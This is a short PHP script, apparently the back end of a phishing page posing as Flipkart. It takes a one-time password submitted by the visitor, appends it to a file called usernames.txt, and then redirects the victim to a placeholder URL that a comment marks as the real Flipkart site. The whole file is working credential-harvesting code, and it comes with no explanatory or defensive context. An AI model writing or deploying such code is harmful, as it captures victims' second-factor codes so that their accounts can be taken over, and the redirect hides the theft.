<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.flipkart.com
header("Location: $url");
exit();
?>